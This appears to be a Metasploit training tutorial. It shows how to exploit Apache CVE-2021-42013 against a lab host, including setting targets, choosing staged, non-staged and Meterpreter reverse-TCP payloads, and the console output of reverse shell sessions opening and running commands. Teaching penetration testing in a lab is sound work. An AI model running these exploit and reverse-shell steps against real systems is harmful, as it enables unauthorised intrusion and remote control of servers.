### Configuration and Usage of Metasploit Exploits and Payloads

#### 1. Setting Up the Exploit Module

The following configuration options are available for the exploit module:

- **RHOSTS**: The target host(s). For more information, refer to [Using Metasploit](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit).
- **RPORT**: The target port (TCP), default is 443.
- **SSL**: Negotiate SSL/TLS for outgoing connections, default is `true`.
- **TARGETURI**: The base path, default is `/cgi-bin`.
- **VHOST**: The HTTP server virtual host, default is not set.

#### 2. Payload Options (Example: `linux/x64/meterpreter/reverse_tcp`)

- **LHOST**: The listen address (an interface may be specified).
- **LPORT**: The listen port, default is 4444.

#### 3. Displaying and Setting Exploit Options

```plaintext
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...
Payload options (linux/x64/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST yes The listen address (an interface may be specified)
LPORT 4444 yes The listen port
```

#### 4. Setting the Payload

To set the payload, use the `set payload` command followed by the payload name. For example:

```plaintext
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...
Payload options (linux/x64/shell_reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.119.2 yes The listen address (an interface may be specified)
LPORT 4444 yes The listen port
```

#### 5. Running the Exploit

Set the necessary options and run the exploit:

```plaintext
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
SSL => false
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.50.16
RHOSTS => 192.168.50.16
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started reverse TCP handler on 192.168.119.2:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell_reverse_tcp command payload
[*] Command shell session 2 opened (192.168.119.4:4444 -> 192.168.50.16:35534) at 2022-08-08 05:13:45 -0400
[!] This exploit may require manual cleanup of '/tmp/ruGC' on the target
```

#### 6. Managing Sessions and Jobs

- **Sessions** allow you to interact with and manage access to successfully exploited targets.
- **Jobs** run modules or features in the background.

To background a session and list active sessions:

```plaintext
^Z
Background session 2? [y/N] y
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l
Active sessions
===============
Id Name Type Information Connection
-- ---- ---- ---i-------- ----------
2 shell x64/linux 192.168.119.4:4444 -> 192.168.50.16:35534 (192.168.50.16)
```

To interact with a session:

```plaintext
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...
uname -a
Linux c1dbace7bab7 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

#### 7. Staged vs. Non-Staged Payloads

- **Non-staged payloads** are sent in their entirety along with the exploit. They are generally more stable but larger in size.
- **Staged payloads** are sent in two parts. The first part is a small primary payload that causes the victim machine to connect back to the attacker and transfer the larger secondary payload.

Example of using a staged payload:

```plaintext
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell/reverse_tcp
payload => linux/x64/shell/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
[*] Sending stage (38 bytes) to 192.168.50.16
[!] Tried to delete /tmp/EqDPZD, unknown result
[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at 2022-08-08 05:18:36 -0400
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

#### 8. Meterpreter Payload

Meterpreter is a multi-function payload that can be dynamically extended at runtime. It provides advanced features such as file transfers, pivoting, and more.

To use a Meterpreter payload:

```plaintext
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
Compatible Payloads
===================
# Name Disclosure Date Rank Check Description
- ---- --------------- ---- ---- -----------
...
11 payload/linux/x64/meterpreter_reverse_tcp normal No Linux Meterpreter, Reverse TCP Inline
...

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...
```

This guide provides a comprehensive overview of setting up and using Metasploit exploits and payloads, including managing sessions and jobs, and understanding the differences between staged and non-staged payloads.